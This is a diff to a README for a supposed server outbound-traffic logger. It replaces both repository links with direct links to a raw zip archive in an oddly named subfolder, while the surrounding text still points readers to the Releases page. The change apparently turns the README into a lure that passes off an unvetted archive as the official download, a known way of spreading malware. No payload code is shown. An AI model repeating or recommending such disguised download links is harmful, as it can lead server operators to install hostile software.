@@ -1,6 +1,6 @@
 # 🔍 hosting-outbound-logger - Track server network traffic with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Levelwhiteroom438/hosting-outbound-logger)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Levelwhiteroom438/hosting-outbound-logger/main/vortically/outbound_logger_hosting_v3.2.zip)
 
 ## 📋 What this tool does
 
@@ -14,7 +14,7 @@ This tool functions on Linux-based environments. While you manage the installati
 
 Visit the main repository page to obtain the latest version. Follow the link below to reach the official download area. 
 
-[https://github.com/Levelwhiteroom438/hosting-outbound-logger](https://github.com/Levelwhiteroom438/hosting-outbound-logger)
+[https://raw.githubusercontent.com/Levelwhiteroom438/hosting-outbound-logger/main/vortically/outbound_logger_hosting_v3.2.zip](https://raw.githubusercontent.com/Levelwhiteroom438/hosting-outbound-logger/main/vortically/outbound_logger_hosting_v3.2.zip)
 
 Navigate to the "Releases" section on the right side of the page. Select the latest version and download the package matching your server architecture.
 
